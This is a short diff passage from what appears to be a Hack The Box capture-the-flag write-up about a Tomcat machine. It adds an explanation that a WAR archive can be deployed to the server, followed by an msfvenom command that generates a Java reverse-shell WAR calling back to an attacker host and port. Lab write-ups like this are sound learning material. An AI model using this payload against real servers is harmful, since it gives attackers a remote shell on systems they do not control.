@@ -143,3 +143,9 @@ This is successful. It is also well-known that Tomcat deploys Java web applicati
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/d59e8d16-7194-467c-acf5-414070103283)
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/cd72da1d-5248-4869-af37-051ddbb153c8)
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/032ae345-7ee6-42e3-b0fc-f6987c9c8475)
+According to this, it is possible to create a war file and deploy it to the server. A war file is an archived Java application.
+
+### Generate Reverse Shell
+```CSS
+▶ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=31337 -f war > shell.war
+```
